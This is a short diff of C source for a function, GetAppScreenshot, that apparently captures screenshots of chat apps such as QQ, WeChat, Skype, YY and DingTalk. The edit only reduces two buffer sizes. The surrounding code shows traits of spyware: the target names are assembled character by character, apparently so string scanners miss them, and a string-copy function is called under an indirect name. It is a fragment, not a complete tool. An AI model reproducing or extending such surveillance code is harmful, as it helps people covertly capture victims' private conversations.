@@ -82,7 +82,7 @@ int __stdcall GetAppScreenshot(int iTimeDelay)
 	char szSkype[] = { 'S','K','Y','P','E',0 };
 	char szdingtalk[] = { 'd','i','n','g','t','A','l','k',0 };
 
-	char szAppNameList[MAX_APPSCREENSHOT_LIMIT][256] = { 0 };
+	char szAppNameList[MAX_APPSCREENSHOT_LIMIT][64] = { 0 };
 	lplstrcpyA(szAppNameList[0], szQQ);
 	lplstrcpyA(szAppNameList[1], szWechat);
 	lplstrcpyA(szAppNameList[2], szSkype);
@@ -93,7 +93,7 @@ int __stdcall GetAppScreenshot(int iTimeDelay)
 	lplstrcpyA(szAppNameList[7], szYY);
 	lplstrcpyA(szAppNameList[8], szdingtalk);
 
-	char szAppWindowClassNameList[MAX_APPSCREENSHOT_LIMIT][256] = { 0 };
+	char szAppWindowClassNameList[MAX_APPSCREENSHOT_LIMIT][64] = { 0 };
 	lplstrcpyA(szAppWindowClassNameList[0], szQQWindowname);
 	lplstrcpyA(szAppWindowClassNameList[1], szWechatWindowName);
 	lplstrcpyA(szAppWindowClassNameList[2], szSkypeWindowName);
